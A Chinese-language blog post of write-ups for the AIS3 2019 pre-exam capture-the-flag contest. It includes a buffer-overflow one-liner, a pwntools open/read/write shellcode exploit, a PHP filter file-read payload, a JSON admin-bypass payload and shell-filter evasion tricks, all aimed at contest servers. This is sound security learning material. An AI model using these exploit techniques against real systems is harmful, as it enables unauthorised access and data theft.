---
title: AIS3 2019 Pre-Exam Writeups
date: 2019-06-21 14:43:49
tags:
	- ctf
---

終於放暑假了，這學期真D忙爆
到現在才有空寫writeup
是說今年暑假行程也滿檔… 駕訓班, 研習營, AIS3…樣樣來
真…真爽

<!-- more -->

上次AIS3時才剛學資安不到半年，分數慘不忍睹菜到只剩備取尾巴
一年後的今天一口氣爬上了8X名，真的非常感謝學長這一年中的教導，雖然還是菜到廢 (我有個學弟好強R QQ)
希望明年能擠進50，希望有天也能變大佬 (X

---

# Pwn

## Welcome BOF

注意！！！這是 x64 系統
逆向看到輸入的變數會放在 `rbp - 30h` 的位置
然後會發現有個沒用到的 function call 了 `system("sh")` 在 `0x40068B`
由於是 x64 系統每個 stack 格子就變成 8 byte 了

```bash
(python -c "from pwn import *; print 'a'*0x38 + p64(0x400687);";cat -) | nc pre-exam-pwn.ais3.org 10000
```

## ORW

第一次看到這種題目，稍微花了時間去研究 seccomp
總之就是一種黑名單白名單的東西
而這題限制了只能用 open, read, write 的 syscall

由於沒開 PIE，所以 addr 並不會變動輸入的東西都放在 `0x6010A0`
先把 shellcode 寫進去
然後最後直接 bof 到剛剛寫 shellcode 的位置

```python=
from pwn import *

context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)

r = remote('pre-exam-pwn.ais3.org', 10001)

r.sendline(asm(shellcode))

r.recvuntil('I give you bof, you know what to do :)')

# r.sendline(0x24*'a' + '\x98\x08\x40\x00\x00\x00\x00\x00')
r.sendline(0x20*'a' + '\xa0\x10\x60\x00\x00\x00\x00\x00')

r.interactive()
```

---

# Reverse

## Trivial

有個 function 有一堆數字 (相信我你一看就會知道是哪個 function)
全轉 char 就會看到 flag 了

## TsaiBro

逆向看 code 邏輯應該是每個字都會被處理成一段字串
把檔案丟進 linux 生出 `A-Za-z{}_` 的字典檔
開始推 flag

## HolyGrenade

把 pyc 丟去 python 的逆向，網上搜一搜很多
發現 flag 是每四個字為一組去加密的
所以 爆破

```python=
from hashlib import md5

def OO0o(arg):
	arg = bytearray(arg, 'ascii')
	for Oo0Ooo in range(0, len(arg), 4):
		O0O0OO0O0O0 = arg[Oo0Ooo]
		iiiii = arg[(Oo0Ooo + 1)]
		ooo0OO = arg[(Oo0Ooo + 2)]
		II1 = arg[(Oo0Ooo + 3)]
		arg[Oo0Ooo + 2] = II1
		arg[Oo0Ooo + 1] = O0O0OO0O0O0
		arg[Oo0Ooo + 3] = iiiii
		arg[Oo0Ooo] = ooo0OO

	return arg.decode('ascii')

# flag += '0' * (len(flag) % 4)
# for Oo0Ooo in range(0, len(flag), 4):
#	print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))

goal = ['ba3a7f3bd92a5d418f5e16886db62674',
		'33e4500b205b80e52dd52e796cba8b7d',
		'7d1c09bbf2025facf6bd0fec0ec6a780',
		'9cedd8dee7b5b87838d7a9bed76df8e5',
		'764d30cb4807c5a870a47b53be6cf662',
		'f1e8fda6c3ff87e43905ea1690624c64',
		'd7939cb11edaa9b1fb05efb4e2946f75',
		'5ae001ebd955475c867617bdb72e7728']

def main(input):
	words = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_'
	for i in range(len(words)):
		for j in range(len(words)):
			for k in range(len(words)):
				for l in range(len(words)):
					flag = words[i] + words[j] + words[k] + words[l]
					if OO0o(md5(bytes(flag[0:4].encode('ascii'))).hexdigest()) == input:
						print(flag)
						return



for i in range(len(goal)):
	main(goal[i])
```

---

# Web

## SimpleWindow

清快取後flag在cookie中

## Hidden

這題超傻眼，看著一堆人解出來沒想過自己卡在這種莫名其妙的地方…
都找到了 flag 在哪算 卻不會執行QQ

關鍵在 js #3133 的 `var r = function(){};`
丟到 console 之後用 `r()` 來執行

## d1v1n6

原本用 base64 會無法顯示完整 `index.php`，因為字數限制 1000
改用 `?path=php://filter/read=string.rot13` 可以噴出完整 code
但發現根本沒差幾行

發現要用 `127.0.0.1` 才能看到 flag 位置，因為是用 `SERVER['REMOTE_ADDR']`
所以 `X-Forwarded-For` 那招沒用

php 偽協議好ㄘ，雖然用 localhost 也不是預期解，因為官方說 regex 沒寫好才導致 localhost 可以用的…

payload : `?path=php://filter/read=convert.base64-encode/resource=http://localhost`

---

# Misc

## Welcome

簽到題
`echo -n 'Welcom to AIS3 pre-exam in 2019!' | md5sum`
這段丟去執行出來然後包起來就是 flag 了

## KcufsJ

根據標題提示是反轉的 JsFuck
執行後會出現在 F12 的 console 中

## Are you admin?

將中間的 `"is_admin":"no"` 用另一個 object 包起來
然後自己構造 `"is_admin":"yes"` 來通過驗證

payload : `{"name":"aaa","is_admin":"yes","obj":{"aaa":"a","is_admin":"no", "age":"12"},"0":"0"}`

## Pysh

一樣很傻眼，找到了 read 可以用但沒乖乖把文件看完想說先放著
放著放著 就忘了…

這題就是在過濾的字中找可以用的指令
很多種 像上面說到的 `read $s;$s`
或是 linux 系統中的預設環境變數 `$BASH`, `$SHELL` (這兩個很屌 看官方解才學到的QQ)

## Crystal Maze

對不起，我手走迷宮還用 Excel 畫地圖…

---

# Crypto

## TCash

單純爆破

```python=
from hashlib import md5,sha256

md5s =    [41, 63, 46, 51,  6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33,  1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27,  1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31,  3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38,  8, 50, 29, 15]
sha256s = [61, 44,  3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11,  3, 24, 35, 40, 46,  3, 42, 59, 36, 41, 41, 41, 40,  9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39,  9, 42,  3, 40, 24, 35, 24, 40,  3, 61, 49, 24, 40,  9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11,  9, 40, 24, 18, 40,  3, 41, 11, 12, 42, 40, 44,  9, 59, 40, 61, 42,  3, 40, 44, 13, 61, 40,  3, 24, 29, 40, 59, 24, 40, 19, 18,  6, 59, 24, 18,  6, 22,  0, 39, 40, 61, 57,  3, 40, 17, 35, 42, 40, 58, 24, 58,  9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58,  9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]

cand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}'

index = 0

while True :
	for i in cand :
		tmp = int(md5(i.encode()).hexdigest(),16)%64
		tmp2 = int(sha256(i.encode()).hexdigest(),16)%64

		if tmp == md5s[index] and tmp2 == sha256s[index] :
			print(i)
			break

	index = index + 1

	if index == len(md5s):
		break
```
